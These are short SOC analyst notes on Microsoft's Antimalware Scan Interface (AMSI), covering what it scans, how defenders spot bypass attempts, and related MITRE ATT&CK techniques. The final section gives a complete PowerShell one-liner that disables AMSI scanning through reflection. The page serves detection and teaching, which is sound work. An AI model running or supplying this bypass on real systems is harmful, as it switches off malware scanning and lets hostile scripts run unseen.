# AMSI (Antimalware Scan Interface) – SOC Analyst Notes

## Overview

AMSI is a Microsoft security interface that allows applications such as PowerShell, Office macros, and scripting hosts to submit code for scanning before execution. This feature enables real-time detection and blocking of malicious scripts.

## Key Concepts

- Integrated with Microsoft Defender and other antivirus engines
- Scans PowerShell, VBScript, JavaScript, macros, and more
- Designed to detect fileless malware and obfuscated commands
- Works on Windows 10+ with supported applications

## SOC Analyst Use Cases

- Monitor for AMSI bypass attempts and obfuscation techniques
- Detect patching or tampering of `amsi.dll` in memory
- Correlate EDR telemetry with suspicious script execution
- Use logs to identify real-time blocked threats

## Relevant MITRE ATT&CK Techniques

- T1059 – Command and Scripting Interpreter
- T1562.001 – Impair Defenses: Disable or Modify Tools
- T1027 – Obfuscated Files or Information

## Example AMSI Bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
